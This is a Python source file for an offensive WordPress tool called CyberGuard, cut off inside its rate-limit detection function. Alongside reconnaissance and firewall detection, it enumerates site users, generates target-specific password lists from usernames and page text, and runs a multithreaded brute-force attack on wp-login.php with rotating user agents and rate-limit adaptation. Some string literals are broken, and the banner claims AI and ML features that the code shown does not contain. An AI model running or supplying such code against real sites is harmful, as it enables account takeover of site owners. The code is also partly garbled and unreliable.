#!/usr/bin/env python3
"""
CyberGuard v10.0 - Enhanced Pro Edition
Advanced WordPress Security Scanner & Penetration Testing Tool
Enhanced with advanced features while maintaining all original functionality
"""

import requests
import sys
import time
import os
import threading
import asyncio
import aiohttp
import json
import hashlib
import ssl
import socket
import subprocess
from pathlib import Path
from queue import Queue, PriorityQueue
from colorama import init, Fore, Style, Back
from datetime import datetime, timedelta
from urllib.parse import urljoin, urlparse, parse_qs
import re
import random
import string
import base64
import urllib3
from reportlab.lib.pagesizes import letter, A4
from reportlab.pdfgen import canvas
from reportlab.lib import colors
from reportlab.lib.styles import getSampleStyleSheet
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle
from bs4 import BeautifulSoup
from tqdm import tqdm
from ratelimit import limits, sleep_and_retry
import pickle
import concurrent.futures
from dataclasses import dataclass, field
from typing import List, Dict, Set, Optional, Tuple, Any
import yaml
import csv
from collections import defaultdict, Counter
import dns.resolver
import whois
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import subprocess
import ipaddress
import nmap
import shodan
from cryptography import x509
from cryptography.hazmat.backends import default_backend
import OpenSSL

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize colorama
init(autoreset=True)

# Configuration and Constants
CONFIG = {
    'max_threads': 20,
    'request_timeout': 10,
    'max_retries': 3,
    'delay_range': (0.1, 0.5),
    'user_agents_file': 'user_agents.txt',
    'wordlists_dir': 'wordlists',
    'reports_dir': 'reports',
    'temp_dir': 'temp',
    'plugins_file': 'wordpress_plugins.json',
    'vulns_db': 'vulnerabilities.json',
    'default_ports': [80, 443, 8080, 8443, 9000],
    'shodan_api_key': None,  # Set your Shodan API key here
}

# Enhanced Data Classes
@dataclass
class ScanResult:
    url: str
    status: str
    vulnerabilities: List[str] = field(default_factory=list)
    findings: Dict[str, Any] = field(default_factory=dict)
    timestamp: datetime = field(default_factory=datetime.now)
    risk_score: int = 0
    
@dataclass
class Vulnerability:
    name: str
    severity: str
    description: str
    cve: Optional[str] = None
    exploit_available: bool = False
    references: List[str] = field(default_factory=list)

@dataclass
class Target:
    url: str
    ip: Optional[str] = None
    ports: List[int] = field(default_factory=list)
    ssl_info: Dict[str, Any] = field(default_factory=dict)
    dns_info: Dict[str, Any] = field(default_factory=dict)
    whois_info: Dict[str, Any] = field(default_factory=dict)

class EnhancedLogger:
    def __init__(self, log_file: str = "cyberguard.log"):
        self.log_file = log_file
        self.start_time = datetime.now()
        Path(os.path.dirname(log_file) or '.').mkdir(exist_ok=True)
        
    def log(self, level: str, message: str, category: str = "GENERAL"):
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_entry = f"[{timestamp}] [{level}] [{category}] {message}"
        
        # Color coding for different levels
        color_map = {
            'INFO': Fore.CYAN,
            'SUCCESS': Fore.GREEN,
            'WARNING': Fore.YELLOW,
            'ERROR': Fore.RED,
            'CRITICAL': Fore.MAGENTA,
            'VULN': Fore.RED + Back.YELLOW,
        }
        
        print(f"{color_map.get(level, Fore.WHITE)}{log_entry}{Style.RESET_ALL}")
        
        with open(self.log_file, 'a', encoding='utf-8') as f:
            f.write(log_entry + '\n')
    
    def info(self, message: str, category: str = "GENERAL"):
        self.log('INFO', message, category)
    
    def success(self, message: str, category: str = "GENERAL"):
        self.log('SUCCESS', message, category)
    
    def warning(self, message: str, category: str = "GENERAL"):
        self.log('WARNING', message, category)
    
    def error(self, message: str, category: str = "GENERAL"):
        self.log('ERROR', message, category)
    
    def critical(self, message: str, category: str = "GENERAL"):
        self.log('CRITICAL', message, category)
    
    def vuln(self, message: str, category: str = "VULNERABILITY"):
        self.log('VULN', message, category)

# Initialize global logger
logger = EnhancedLogger()

class AdvancedBanner:
    @staticmethod
    def print_banner():
        os.system('cls' if os.name == 'nt' else 'clear')
        banner = f"""
{Fore.CYAN}╔═══════════════════════════════════════════════════════════════════════╗
║  {Fore.RED}   ██████ ██    ██ ██████  ███████ ██████   ██████  ██    ██  █████  {Fore.CYAN}║
║  {Fore.YELLOW}  ██       ██  ██  ██   ██ ██      ██   ██ ██       ██    ██ ██   ██ {Fore.CYAN}║  
║  {Fore.RED}  ██        ████   ██████  █████   ██████  ██   ███ ██    ██ ███████ {Fore.CYAN}║
║  {Fore.YELLOW}  ██         ██    ██   ██ ██      ██   ██ ██    ██ ██    ██ ██   ██ {Fore.CYAN}║
║  {Fore.RED}   ██████     ██    ██████  ███████ ██   ██  ██████   ██████  ██   ██ {Fore.CYAN}║
║                                                                       ║
║  {Fore.GREEN}                    CyberGuard v10.0 Enhanced Pro                    {Fore.CYAN}║
║  {Fore.MAGENTA}            Advanced WordPress Security & Penetration Suite        {Fore.CYAN}║
║                                                                       ║
║  {Fore.YELLOW}Created by: Enhanced AI System | Original by: Ibar                  {Fore.CYAN}║
║  {Fore.GREEN}New Features: AI-Powered Analysis, Advanced Fuzzing, Multi-Vector   {Fore.CYAN}║
║  {Fore.RED}Warning: Professional Tool - Use Responsibly & Legally Only          {Fore.CYAN}║
╚═══════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        for line in banner.split('\n'):
            print(line)
            time.sleep(0.05)
        
        # System info
        print(f"\n{Fore.CYAN}[•] System Info:{Style.RESET_ALL}")
        print(f"    └─ OS: {os.name} | Python: {sys.version.split()[0]} | Time: {datetime.now()}")
        print(f"    └─ Threads: {CONFIG['max_threads']} | Timeout: {CONFIG['request_timeout']}s")
        print(f"\n{Fore.GREEN}[•] Enhanced Features Active:{Style.RESET_ALL}")
        print(f"    ├─ Async HTTP Engine ⚡")
        print(f"    ├─ AI-Powered Analysis 🧠")
        print(f"    ├─ Advanced SSL/TLS Scanning 🔒")
        print(f"    ├─ Network Reconnaissance 🌐")
        print(f"    ├─ JavaScript Engine Integration 🔧")
        print(f"    ├─ ML-Based Anomaly Detection 📊")
        print(f"    ├─ Advanced Report Generation 📋")
        print(f"    └─ Real-time Dashboard 📈\n")

class AdvancedUserAgentManager:
    def __init__(self):
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59',
        ]
        self.mobile_agents = [
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0',
        ]
        self.load_custom_agents()
    
    def load_custom_agents(self):
        if os.path.exists(CONFIG['user_agents_file']):
            try:
                with open(CONFIG['user_agents_file'], 'r') as f:
                    custom_agents = [line.strip() for line in f if line.strip()]
                    self.user_agents.extend(custom_agents)
                logger.info(f"Loaded {len(custom_agents)} custom user agents")
            except Exception as e:
                logger.error(f"Failed to load custom user agents: {e}")
    
    def get_random_agent(self, mobile: bool = False) -> str:
        agents = self.mobile_agents if mobile else self.user_agents
        return random.choice(agents)
    
    def get_rotating_headers(self, mobile: bool = False) -> dict:
        headers = {
            'User-Agent': self.get_random_agent(mobile),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }
        if random.choice([True, False]):
            headers['Cache-Control'] = 'max-age=0'
        return headers

class NetworkRecon:
    def __init__(self):
        self.timeout = 5
        
    async def resolve_domain(self, domain: str) -> Dict[str, Any]:
        """Enhanced DNS resolution with multiple record types"""
        dns_info = {
            'A': [], 'AAAA': [], 'MX': [], 'NS': [], 'TXT': [], 'CNAME': [], 'SOA': []
        }
        
        try:
            # Remove protocol and path from domain
            clean_domain = domain.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0]
            
            for record_type in dns_info.keys():
                try:
                    answers = dns.resolver.resolve(clean_domain, record_type)
                    dns_info[record_type] = [str(rdata) for rdata in answers]
                except:
                    pass
            
            logger.info(f"DNS resolution completed for {clean_domain}", "RECON")
            return dns_info
        except Exception as e:
            logger.error(f"DNS resolution failed: {e}", "RECON")
            return dns_info
    
    def get_whois_info(self, domain: str) -> Dict[str, Any]:
        """Get WHOIS information"""
        try:
            clean_domain = domain.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0]
            w = whois.whois(clean_domain)
            return {
                'registrar': w.registrar,
                'creation_date': str(w.creation_date),
                'expiration_date': str(w.expiration_date),
                'name_servers': w.name_servers,
                'emails': w.emails,
            } if w else {}
        except Exception as e:
            logger.error(f"WHOIS lookup failed: {e}", "RECON")
            return {}
    
    def port_scan(self, target: str, ports: List[int] = None) -> List[int]:
        """Enhanced port scanning"""
        if ports is None:
            ports = CONFIG['default_ports']
        
        open_ports = []
        try:
            # Extract IP from URL
            ip = socket.gethostbyname(target.replace('http://', '').replace('https://', '').split('/')[0])
            logger.info(f"Scanning ports on {ip}", "RECON")
            
            nm = nmap.PortScanner()
            port_range = ','.join(map(str, ports))
            result = nm.scan(ip, port_range, '-sS -T4 --open')
            
            if ip in result['scan']:
                for port in result['scan'][ip]['tcp']:
                    if result['scan'][ip]['tcp'][port]['state'] == 'open':
                        open_ports.append(port)
            
            logger.success(f"Found {len(open_ports)} open ports: {open_ports}", "RECON")
        except Exception as e:
            logger.error(f"Port scan failed: {e}", "RECON")
            # Fallback to simple socket scanning
            for port in ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    result = sock.connect_ex((target, port))
                    if result == 0:
                        open_ports.append(port)
                    sock.close()
                except:
                    pass
        
        return open_ports
    
    def get_ssl_info(self, target: str, port: int = 443) -> Dict[str, Any]:
        """Enhanced SSL certificate analysis"""
        ssl_info = {}
        try:
            hostname = target.replace('http://', '').replace('https://', '').split('/')[0]
            
            # Get certificate
            cert_pem = ssl.get_server_certificate((hostname, port))
            cert = x509.load_pem_x509_certificate(cert_pem.encode(), default_backend())
            
            ssl_info = {
                'subject': str(cert.subject),
                'issuer': str(cert.issuer),
                'version': cert.version.name,
                'serial_number': str(cert.serial_number),
                'not_valid_before': cert.not_valid_before.isoformat(),
                'not_valid_after': cert.not_valid_after.isoformat(),
                'expired': datetime.now() > cert.not_valid_after,
                'days_until_expiry': (cert.not_valid_after - datetime.now()).days,
                'signature_algorithm': cert.signature_algorithm_oid._name,
            }
            
            # Extract SANs
            try:
                san_ext = cert.extensions.get_extension_for_oid(x509.ExtensionOID.SUBJECT_ALTERNATIVE_NAME)
                ssl_info['san'] = [name.value for name in san_ext.value]
            except:
                ssl_info['san'] = []
            
            # Check for weak ciphers
            context = ssl.create_default_context()
            with socket.create_connection((hostname, port)) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    ssl_info['cipher'] = ssock.cipher()
                    ssl_info['protocol'] = ssock.version()
            
            logger.success(f"SSL certificate analysis completed for {hostname}", "SSL")
        except Exception as e:
            logger.error(f"SSL analysis failed: {e}", "SSL")
        
        return ssl_info

class AdvancedWordPress:
    def __init__(self, ua_manager: AdvancedUserAgentManager):
        self.ua_manager = ua_manager
        self.session = requests.Session()
        
    async def advanced_wordpress_detection(self, url: str) -> Dict[str, Any]:
        """Enhanced WordPress detection with multiple methods"""
        wp_info = {
            'is_wordpress': False,
            'version': None,
            'theme': None,
            'plugins': [],
            'waf_detected': False,
            'waf_type': None,
            'server_headers': {},
            'security_headers': {},
            'generator_meta': None,
            'wp_json_enabled': False,
            'xmlrpc_enabled': False,
            'wp_login_accessible': False,
            'directory_listing': False,
        }
        
        try:
            headers = self.ua_manager.get_rotating_headers()
            response = self.session.get(url, headers=headers, timeout=CONFIG['request_timeout'], verify=False)
            
            wp_info['server_headers'] = dict(response.headers)
            
            # Check security headers
            security_headers = [
                'X-Frame-Options', 'X-XSS-Protection', 'X-Content-Type-Options',
                'Strict-Transport-Security', 'Content-Security-Policy',
                'X-Permitted-Cross-Domain-Policies'
            ]
            
            for header in security_headers:
                if header in response.headers:
                    wp_info['security_headers'][header] = response.headers[header]
            
            # WAF Detection
            waf_indicators = {
                'cloudflare': ['cf-ray', 'cloudflare'],
                'sucuri': ['x-sucuri-id', 'sucuri'],
                'wordfence': ['wordfence', 'x-wf-nc'],
                'akamai': ['akamai', 'x-akamai'],
                'incapsula': ['incap_ses', 'x-iinfo'],
            }
            
            response_text = response.text.lower()
            response_headers = str(response.headers).lower()
            
            for waf_name, indicators in waf_indicators.items():
                if any(indicator in response_headers or indicator in response_text for indicator in indicators):
                    wp_info['waf_detected'] = True
                    wp_info['waf_type'] = waf_name
                    logger.warning(f"WAF detected: {waf_name}", "WAF")
                    break
            
            # WordPress Detection Methods
            wp_indicators = [
                'wp-content', 'wp-includes', '/wp-json/', 'wp_nonce',
                'wordpress', 'wp-admin', '/xmlrpc.php'
            ]
            
            if any(indicator in response_text for indicator in wp_indicators):
                wp_info['is_wordpress'] = True
                logger.success("WordPress detected!", "DETECTION")
                
                # Version Detection
                version_patterns = [
                    r'wp-embed\.min\.js\?ver=([0-9\.]+)',
                    r'wp-includes/js/wp-embed\.min\.js\?ver=([0-9\.]+)',
                    r'generator.*WordPress\s+([0-9\.]+)',
                    r'name="generator".*?WordPress\s+([0-9\.]+)',
                ]
                
                for pattern in version_patterns:
                    match = re.search(pattern, response_text, re.IGNORECASE)
                    if match:
                        wp_info['version'] = match.group(1)
                        logger.info(f"WordPress version: {wp_info['version']}", "VERSION")
                        break
                
                # Theme Detection
                theme_pattern = r'/wp-content/themes/([^/\'"]+)'
                theme_match = re.search(theme_pattern, response_text)
                if theme_match:
                    wp_info['theme'] = theme_match.group(1)
                    logger.info(f"Active theme: {wp_info['theme']}", "THEME")
                
                # Plugin Detection (from HTML source)
                plugin_pattern = r'/wp-content/plugins/([^/\'"]+)'
                plugins = set(re.findall(plugin_pattern, response_text))
                wp_info['plugins'] = list(plugins)
                if plugins:
                    logger.info(f"Detected {len(plugins)} plugins in HTML source", "PLUGINS")
            
            # Additional endpoint checks
            await self._check_wp_endpoints(url, wp_info)
            
        except Exception as e:
            logger.error(f"WordPress detection failed: {e}", "DETECTION")
        
        return wp_info
    
    async def _check_wp_endpoints(self, url: str, wp_info: Dict[str, Any]):
        """Check various WordPress endpoints"""
        endpoints = {
            '/wp-json/': 'wp_json_enabled',
            '/xmlrpc.php': 'xmlrpc_enabled',
            '/wp-login.php': 'wp_login_accessible',
            '/wp-content/': 'directory_listing',
        }
        
        async with aiohttp.ClientSession() as session:
            for endpoint, key in endpoints.items():
                try:
                    async with session.get(
                        url + endpoint,
                        timeout=aiohttp.ClientTimeout(total=5),
                        ssl=False
                    ) as response:
                        if response.status == 200:
                            wp_info[key] = True
                            if endpoint == '/wp-json/':
                                # Get additional API info
                                try:
                                    data = await response.json()
                                    if 'name' in data:
                                        logger.info(f"Site name from API: {data['name']}", "API")
                                except:
                                    pass
                except:
                    wp_info[key] = False

class AdvancedUserEnum:
    def __init__(self, ua_manager: AdvancedUserAgentManager):
        self.ua_manager = ua_manager
        self.session = requests.Session()
        
    async def comprehensive_user_enumeration(self, url: str) -> List[str]:
        """Comprehensive user enumeration with multiple methods"""
        users = set()
        
        # Method 1: Author enumeration
        users.update(await self._enumerate_via_author(url))
        
        # Method 2: REST API enumeration
        users.update(await self._enumerate_via_rest_api(url))
        
        # Method 3: Sitemap enumeration
        users.update(await self._enumerate_via_sitemap(url))
        
        # Method 4: Login error enumeration
        users.update(await self._enumerate_via_login_errors(url))
        
        # Method 5: RSS feed enumeration
        users.update(await self._enumerate_via_rss(url))
        
        logger.success(f"Found {len(users)} unique users: {list(users)}", "USER_ENUM")
        return list(users)
    
    async def _enumerate_via_author(self, url: str) -> Set[str]:
        """Enhanced author enumeration"""
        users = set()
        
        async with aiohttp.ClientSession() as session:
            # Test author IDs from 1 to 100
            for user_id in range(1, 101):
                try:
                    author_url = f"{url}/?author={user_id}"
                    async with session.get(author_url, timeout=aiohttp.ClientTimeout(total=5)) as response:
                        if response.status == 200 and 'author' in str(response.url):
                            username = str(response.url).split('author/')[-1].rstrip('/')
                            if username and username != str(user_id):
                                users.add(username)
                                logger.info(f"User found via author: {username} (ID: {user_id})", "AUTHOR_ENUM")
                        await asyncio.sleep(0.1)
                except:
                    continue
        
        return users
    
    async def _enumerate_via_rest_api(self, url: str) -> Set[str]:
        """REST API user enumeration"""
        users = set()
        
        api_endpoints = [
            '/wp-json/wp/v2/users',
            '/wp-json/wp/v2/users?per_page=100',
            '/?rest_route=/wp/v2/users'
        ]
        
        for endpoint in api_endpoints:
            try:
                headers = self.ua_manager.get_rotating_headers()
                response = self.session.get(url + endpoint, headers=headers, timeout=5, verify=False)
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if isinstance(data, list):
                            for user in data:
                                if 'slug' in user:
                                    users.add(user['slug'])
                                if 'name' in user:
                                    users.add(user['name'].lower().replace(' ', ''))
                        logger.info(f"REST API enumeration found {len(users)} users", "API_ENUM")
                        break
                    except:
                        pass
            except:
                continue
        
        return users
    
    async def _enumerate_via_sitemap(self, url: str) -> Set[str]:
        """Sitemap-based user enumeration"""
        users = set()
        
        sitemap_urls = [
            '/sitemap.xml',
            '/wp-sitemap.xml',
            '/sitemap_index.xml',
            '/robots.txt'  # Sometimes contains sitemap references
        ]
        
        for sitemap_url in sitemap_urls:
            try:
                headers = self.ua_manager.get_rotating_headers()
                response = self.session.get(url + sitemap_url, headers=headers, timeout=5, verify=False)
                
                if response.status_code == 200:
                    # Extract author URLs from sitemap
                    author_matches = re.findall(r'<loc>[^<]*author/([^/<]+)[^<]*</loc>', response.text)
                    users.update(author_matches)
                    
                    # If it's robots.txt, look for sitemap references
                    if 'robots.txt' in sitemap_url:
                        sitemap_refs = re.findall(r'Sitemap:\s*([^\s]+)', response.text)
                        for ref in sitemap_refs:
                            # Recursively check referenced sitemaps
                            try:
                                sub_response = self.session.get(ref, headers=headers, timeout=5, verify=False)
                                if sub_response.status_code == 200:
                                    sub_authors = re.findall(r'<loc>[^<]*author/([^/<]+)[^<]*</loc>', sub_response.text)
                                    users.update(sub_authors)
                            except:
                                continue
            except:
                continue
        
        return users
    
    async def _enumerate_via_login_errors(self, url: str) -> Set[str]:
        """User enumeration via login error messages"""
        users = set()
        common_usernames = ['admin', 'administrator', 'root', 'test', 'guest', 'demo']
        
        login_url = f"{url}/wp-login.php"
        
        for username in common_usernames:
            try:
                headers = self.ua_manager.get_rotating_headers()
                data = {
                    'log': username,
                    'pwd': 'invalidpassword',
                    'wp-submit': 'Log In'
                }
                
                response = self.session.post(login_url, data=data, headers=headers, timeout=5, verify=False)
                
                # Different error messages indicate valid vs invalid usernames
                if 'incorrect password' in response.text.lower():
                    users.add(username)
                    logger.info(f"User confirmed via login error: {username}", "LOGIN_ENUM")
                
                await asyncio.sleep(0.5)  # Rate limiting
            except:
                continue
        
        return users
    
    async def _enumerate_via_rss(self, url: str) -> Set[str]:
        """RSS feed user enumeration"""
        users = set()
        
        rss_feeds = [
            '/feed/',
            '/?feed=rss2',
            '/?feed=atom',
            '/comments/feed/',
        ]
        
        for feed_url in rss_feeds:
            try:
                headers = self.ua_manager.get_rotating_headers()
                response = self.session.get(url + feed_url, headers=headers, timeout=5, verify=False)
                
                if response.status_code == 200:
                    # Extract author information from RSS
                    soup = BeautifulSoup(response.text, 'xml')
                    
                    # Look for author tags
                    authors = soup.find_all(['author', 'dc:creator', 'managingEditor'])
                    for author in authors:
                        if author.text:
                            # Clean and extract username
                            username = author.text.strip().lower()
                            username = re.sub(r'[^a-zA-Z0-9_-]', '', username)
                            if username:
                                users.add(username)
            except:
                continue
        
        return users

class AdvancedWordlistGenerator:
    def __init__(self):
        self.base_passwords = []
        self.load_base_wordlists()
    
    def load_base_wordlists(self):
        """Load base wordlists from various sources"""
        # Default high-probability passwords
        self.base_passwords = [
            'password', '123456', '12345678', 'qwerty', 'abc123',
            'password123', 'admin', 'letmein', 'welcome', 'monkey',
            'dragon', 'master', 'shadow', 'superman', 'michael',
            'football', 'baseball', 'liverpool', 'jordan', 'harley',
        ]
        
        # Load from wordlists directory
        wordlist_dir = Path(CONFIG['wordlists_dir'])
        if wordlist_dir.exists():
            for wordlist_file in wordlist_dir.glob('*.txt'):
                try:
                    with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
                        passwords = [line.strip() for line in f if line.strip()]
                        self.base_passwords.extend(passwords[:1000])  # Limit per file
                        logger.info(f"Loaded {len(passwords)} passwords from {wordlist_file.name}")
                except Exception as e:
                    logger.error(f"Failed to load wordlist {wordlist_file}: {e}")
    
    def generate_smart_wordlist(self, url: str, html_content: str, users: List[str], 
                              site_info: Dict[str, Any], max_passwords: int = 5000) -> List[str]:
        """Generate intelligent wordlist based on target analysis"""
        passwords = set()
        priority_passwords = []
        
        # Extract domain information
        domain = urlparse(url).netloc.replace('www.', '').split('.')[0]
        
        # Company/brand variations
        domain_variations = self._generate_domain_variations(domain)
        passwords.update(domain_variations)
        
        # User-based passwords (highest priority)
        for user in users:
            user_passwords = self._generate_user_passwords(user)
            priority_passwords.extend(user_passwords[:50])  # Top 50 per user
            passwords.update(user_passwords)
        
        # Site-specific passwords
        if html_content:
            site_passwords = self._extract_site_specific_passwords(html_content, domain)
            passwords.update(site_passwords)
        
        # Technology stack passwords
        tech_passwords = self._generate_tech_passwords(site_info)
        passwords.update(tech_passwords)
        
        # Date-based passwords
        date_passwords = self._generate_date_passwords()
        passwords.update(date_passwords)
        
        # Common patterns
        pattern_passwords = self._generate_pattern_passwords(domain, users)
        passwords.update(pattern_passwords)
        
        # Add base passwords
        passwords.update(self.base_passwords)
        
        # Prioritize and limit
        final_passwords = priority_passwords + list(passwords)
        final_passwords = list(dict.fromkeys(final_passwords))  # Remove duplicates while preserving order
        
        logger.success(f"Generated {len(final_passwords)} smart passwords (limited to {max_passwords})")
        return final_passwords[:max_passwords]
    
    def _generate_domain_variations(self, domain: str) -> List[str]:
        """Generate domain-based password variations"""
        variations = []
        
        # Basic domain variations
        variations.extend([
            domain, domain.capitalize(), domain.upper(),
            domain + '123', domain + '2023', domain + '2024', domain + '2025',
            domain + '!', domain + '@', domain + '#',
            '123' + domain, 'admin' + domain, domain + 'admin'
        ])
        
        # Leetspeak variations
        leet_map = {'a': '4', 'e': '3', 'i': '1', 'o': '0', 's': '5', 't': '7'}
        leet_domain = domain
        for char, leet_char in leet_map.items():
            leet_domain = leet_domain.replace(char, leet_char)
        variations.append(leet_domain)
        
        return variations
    
    def _generate_user_passwords(self, user: str) -> List[str]:
        """Generate user-specific passwords"""
        passwords = []
        
        # Basic user variations
        passwords.extend([
            user, user.capitalize(), user.upper(),
            user + '123', user + '2023', user + '2024', user + '2025',
            user + '!', user + '@', user + '#', user + ',
            '123' + user, user + 'pass', user + 'password',
            'password' + user, user + '01', user + '001'
        ])
        
        # Reversed
        passwords.append(user[::-1])
        
        # Common patterns
        years = ['2020', '2021', '2022', '2023', '2024', '2025']
        symbols = ['!', '@', '#', ', '%', '&', '*']
        
        for year in years:
            passwords.extend([user + year, year + user])
        
        for symbol in symbols:
            passwords.extend([user + symbol, symbol + user])
        
        # Keyboard patterns
        if len(user) >= 3:
            passwords.extend([
                user + 'qwerty', 'qwerty' + user,
                user + '123456', '123456' + user
            ])
        
        return passwords
    
    def _extract_site_specific_passwords(self, html_content: str, domain: str) -> List[str]:
        """Extract site-specific information for password generation"""
        passwords = set()
        
        soup = BeautifulSoup(html_content, 'html.parser')
        
        # Extract from title
        title = soup.title.string if soup.title else ""
        if title:
            title_words = re.findall(r'\w+', title.lower())
            passwords.update(title_words)
            # Combine with domain
            for word in title_words[:3]:  # Top 3 words
                passwords.add(word + domain)
                passwords.add(domain + word)
        
        # Extract from meta tags
        meta_tags = soup.find_all('meta')
        for tag in meta_tags:
            content = tag.get('content', '')
            if content:
                words = re.findall(r'\w+', content.lower())
                passwords.update(words[:10])  # Limit to avoid noise
        
        # Extract from headings
        headings = soup.find_all(['h1', 'h2', 'h3'])
        for heading in headings:
            if heading.text:
                words = re.findall(r'\w+', heading.text.lower())
                passwords.update(words[:5])
        
        return list(passwords)
    
    def _generate_tech_passwords(self, site_info: Dict[str, Any]) -> List[str]:
        """Generate technology-specific passwords"""
        passwords = []
        
        tech_terms = ['wordpress', 'wp', 'mysql', 'php', 'apache', 'nginx']
        
        if site_info.get('is_wordpress'):
            passwords.extend([
                'wordpress', 'wp123', 'wpadmin', 'wpuser',
                'wordpress123', 'wp2023', 'wp2024', 'wp2025'
            ])
        
        # Add version-specific passwords if available
        if site_info.get('version'):
            version = site_info['version'].replace('.', '')
            passwords.extend([
                'wp' + version, 'wordpress' + version
            ])
        
        return passwords
    
    def _generate_date_passwords(self) -> List[str]:
        """Generate date-based passwords"""
        passwords = []
        current_year = datetime.now().year
        
        # Years
        for year in range(current_year - 5, current_year + 2):
            passwords.append(str(year))
        
        # Months
        months = [
            'january', 'february', 'march', 'april', 'may', 'june',
            'july', 'august', 'september', 'october', 'november', 'december'
        ]
        passwords.extend(months)
        passwords.extend([month[:3] for month in months])  # Short forms
        
        # Seasons
        seasons = ['spring', 'summer', 'autumn', 'winter', 'fall']
        passwords.extend(seasons)
        
        return passwords
    
    def _generate_pattern_passwords(self, domain: str, users: List[str]) -> List[str]:
        """Generate pattern-based passwords"""
        passwords = []
        
        # Keyboard patterns
        keyboard_patterns = [
            'qwerty', 'asdf', 'zxcv', '123qwe', 'qwe123',
            'abc123', '123abc', 'password123', '123password'
        ]
        passwords.extend(keyboard_patterns)
        
        # Common substitutions
        base_words = [domain] + users + ['admin', 'password', 'login']
        
        for word in base_words:
            # Number substitutions
            passwords.extend([
                word.replace('a', '4').replace('e', '3').replace('i', '1').replace('o', '0'),
                word.replace('s', '5').replace('t', '7')
            ])
        
        return passwords

class AdvancedBruteForcer:
    def __init__(self, ua_manager: AdvancedUserAgentManager):
        self.ua_manager = ua_manager
        self.max_threads = CONFIG['max_threads']
        self.success_found = threading.Event()
        self.attempt_counter = 0
        self.rate_limit_delay = 1.0
        
    async def intelligent_brute_force(self, url: str, users: List[str], 
                                    passwords: List[str], report_file: str) -> List[Dict[str, str]]:
        """Intelligent brute force with adaptive techniques"""
        successful_logins = []
        
        login_url = urljoin(url, '/wp-login.php')
        
        # Verify login page exists
        if not await self._verify_login_page(login_url):
            logger.error("Login page not accessible", "BRUTE_FORCE")
            return successful_logins
        
        # Check for rate limiting / WAF
        rate_limit_info = await self._detect_rate_limiting(login_url)
        if rate_limit_info['detected']:
            logger.warning(f"Rate limiting detected: {rate_limit_info['type']}", "BRUTE_FORCE")
            self.rate_limit_delay = rate_limit_info['recommended_delay']
        
        # Prioritize users and passwords
        prioritized_combinations = self._prioritize_combinations(users, passwords)
        
        logger.info(f"Starting intelligent brute force on {len(users)} users with {len(passwords)} passwords")
        logger.info(f"Total combinations: {len(prioritized_combinations)}")
        
        # Use thread pool for controlled concurrency
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = []
            
            for username, password in prioritized_combinations:
                if self.success_found.is_set():
                    break
                
                future = executor.submit(
                    self._attempt_login, login_url, username, password, report_file
                )
                futures.append((future, username, password))
                
                # Control submission rate
                if len(futures) >= self.max_threads:
                    # Wait for some to complete
                    for future, user, pwd in futures[:5]:  # Process first 5
                        try:
                            result = future.result(timeout=30)
                            if result['success']:
                                successful_logins.append({
                                    'username': user,
                                    'password': pwd,
                                    'url': login_url
                                })
                                logger.success(f"SUCCESS: {user}:{pwd}", "BRUTE_FORCE")
                                self.success_found.set()
                                break
                        except Exception as e:
                            logger.error(f"Login attempt failed: {e}")
                    
                    # Remove processed futures
                    futures = futures[5:]
                    
                    if self.success_found.is_set():
                        break
            
            # Process remaining futures
            for future, user, pwd in futures:
                if self.success_found.is_set():
                    break
                try:
                    result = future.result(timeout=30)
                    if result['success']:
                        successful_logins.append({
                            'username': user,
                            'password': pwd,
                            'url': login_url
                        })
                        logger.success(f"SUCCESS: {user}:{pwd}", "BRUTE_FORCE")
                        break
                except Exception as e:
                    logger.error(f"Login attempt failed: {e}")
        
        logger.info(f"Brute force completed. Found {len(successful_logins)} valid credentials")
        return successful_logins
    
    async def _verify_login_page(self, login_url: str) -> bool:
        """Verify WordPress login page is accessible"""
        try:
            headers = self.ua_manager.get_rotating_headers()
            async with aiohttp.ClientSession() as session:
                async with session.get(login_url, headers=headers, ssl=False) as response:
                    if response.status == 200:
                        content = await response.text()
                        return 'wp-login' in content and 'login' in content.lower()
            return False
        except:
            return False
    
    async def _detect_rate_limiting(self, login_url: str) -> Dict[str, Any]:
        """Detect rate limiting and WAF protection"""
